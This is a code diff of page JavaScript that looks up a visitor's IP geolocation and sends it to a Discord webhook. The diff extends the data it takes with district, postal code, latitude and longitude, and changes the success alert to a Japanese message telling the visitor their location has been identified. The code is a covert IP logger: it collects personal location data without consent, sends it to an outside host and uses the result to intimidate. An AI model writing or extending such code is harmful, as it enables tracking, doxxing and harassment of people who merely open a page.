@@ -12,10 +12,14 @@
                 embeds: [{
                     title: '位置情報',
                     description: `
-                        **IPアドレス**: \`${ipInfo.ip}\`
+                        **IPアドレス**: \`${ipInfo.query}\`
                         **国**: \`${ipInfo.country}\`
-                        **県**: \`${ipInfo.region}\`
+                        **県**: \`${ipInfo.regionName}\`
                         **市**: \`${ipInfo.city}\`
+                        **町**: \`${ipInfo.district}\`
+                        **郵便番号**: \`${ipInfo.zip}\`
+                        **緯度**: \`${ipInfo.lat}\`
+                        **経度**: \`${ipInfo.lon}\`
                     `,
                     color: 3447003 // 青色
                 }]
@@ -32,7 +36,7 @@
                 if (!response.ok) {
                     console.error('Discordへの送信に失敗しました:', response.statusText);
                 } else {
-                    alert('✅');
+                    alert('あなたの位置情報は特定されました。');
                 }
             })
             .catch(error => console.error('Discordへの送信に失敗しました:', error));
@@ -40,7 +44,7 @@
 
         // IPアドレスを取得して情報をDiscordに送信する関数
         function sendIPAddressToDiscord() {
-            fetch('https://ipinfo.io/json')
+            fetch('http://ip-api.com/json')
                 .then(response => response.json())
                 .then(data => {
                     sendToDiscord(data); // 取得した情報をDiscordに送信
